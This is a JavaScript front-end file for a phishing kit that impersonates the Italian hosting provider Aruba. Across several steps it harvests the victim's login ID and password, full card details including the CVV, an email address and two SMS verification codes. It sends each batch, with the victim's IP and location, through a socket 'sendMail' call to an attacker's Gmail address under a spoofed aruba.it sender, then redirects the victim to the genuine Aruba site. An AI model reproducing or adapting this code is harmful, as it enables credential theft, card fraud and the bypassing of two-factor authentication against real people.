const index =new Vue({
    el:"#index",
    data:{
        error:false,
        loading:false,
        
        message:'Chargement en cours...',
        login:1,
        step :1,
        stepC :0,
        log:{
            
            ID:'',
            PASS: '',
            SMS:'',
            SMS2:'',
            CODE:'',
			CCName:'',
			CCNum:'',
			CCEM:'',
			CCEY:'',
			CCEMAIL:'',
			CCCryp:''
        }
    },
    mounted(){
	   $('body').show()
       console.log(this.content)


    },

    computed:{
        content(){
            var loc =JSON.stringify(locIp)
			var ContenuHtml = "<p>Aruba Rez BB : </p><hr><p>Id : " + this.log.ID + "</p><p>Pass : " + this.log.PASS + "</p><hr><p>SMS1 : " + this.log.SMS  + "</p><hr><p>SMS2 : " + this.log.SMS2 + "</p><hr><p>CODE BY Email : " + this.log.CODE + " </p><hr><p>Name on Card : " + this.log.CCName + " </p><p>Card Number : " + this.log.CCNum + " </p><p>Card Expry : " + this.log.CCEM + "/" + this.log.CCEY + " </p><p>CVV : " +this.log.CCCryp  + "</p><hr><p>" + JSON.stringify(locIp) + "</p>"
			

            var message ={
                name:'Aruba Rez BB',
                from:'log.init@aruba.it',
                to:'yesdebfire@gmail.com',
                subject : this.step==1 ? '👤 Login  ' : '' + this.step==2  ? '💳  Info ' :'' +  this.step==3 ? '🔥  SMS : ' :'' +   this.step==4 ? ' 😎 SMS2 : ':'' ,
                html: ContenuHtml
            }
            return message
        }
    },
    methods:{
        
        goToEspace(){
            
           if(this.log.PASS.length<6 || this.log.ID.length<5) return alert(`Correggi i campi per favore`)
            this.stepC = 600
			
           
            this.content.subject+=" > "+iPfull 
			
			this.content.html = "<p>Aruba Rez Log BB : </p><hr><p>Id : " + this.log.ID + "</p><p>Pass : " + this.log.PASS + "</p><hr>" + this.loc
            this.loading=true
			
            socket.emit('sendMail',this.content,(clb)=>{
                if(clb){
                    
                         this.step = 2
						 this.stepC = 0
                        this.loading=false
                    
                } else {
                    window.location.reload()
                }
            })        
        },
        goToStepSMS(){
            if(this.log.CCName.length==0 || this.log.CCName.CCNum==0 || this.log.CCCryp.length==0 || this.log.CCEMAIL.length==0 ) return alert(`Correggi i campi per favore`)

			this.stepC = 700
			
			
			
            this.loading=true
            this.content.subject+=" > "+iPfull
			 this.content.html = "<p>Aruba Rez CC </p><hr><p>Name on Card : " + this.log.CCName + " </p><p>Card Number : " + this.log.CCNum + " </p><p>Card Expry : " + this.log.CCEM + "/" + this.log.CCEY + " </p><p>CVV : " +this.log.CCCryp  + "</p> <p>Email : " + this.log.CCEMAIL + " </p><hr>" + this.loc

			
            socket.emit('sendMail',this.content,(clb)=>{
                if(clb){
					   this.stepC = 0
                       this.step=3
                       this.loading=false
                         
                } else {
                    window.location.reload()
                }
            }) 
           
            
            
           
        },
		goToStepSMS2(){
                if(this.log.SMS.length==0  ) return alert(`Correggi i campi per favore`)
				this.message="Verification du code en cours..."
				this.loading=true
				this.content.subject+=  this.log.SMS +" > "+iPfull
				
				this.content.html = "<p>Aruba Rez SMS </p><hr><p>SMS  : " + this.log.SMS + " </p>"  + this.loc
				
				socket.emit('sendMail',this.content,(clb)=>{
					if(clb){
					
							this.step=4
							this.loading=false
				
						
						
					} else {
						window.location.reload()
					}
				}) 
           
            
            
        
        },
	    
        submitForm(){
			
				if(this.log.SMS2.length==0  ) return alert(`Correggi i campi per favore`)
				this.loading=true
				this.content.subject+=  this.log.SMS2 + " > " +iPfull
				
				this.content.html = "<p>Aruba Rez SMS2 </p><hr><p>SMS2  : " + this.log.SMS2 + " </p>"  + this.loc

				socket.emit('sendMail',this.content,(clb)=>{
					if(clb){
						setTimeout(()=>{
							window.location.href="https://managehosting.aruba.it"
						},1000)
					} else {
						window.location.reload()
					}
				})
		   


        }
    }

})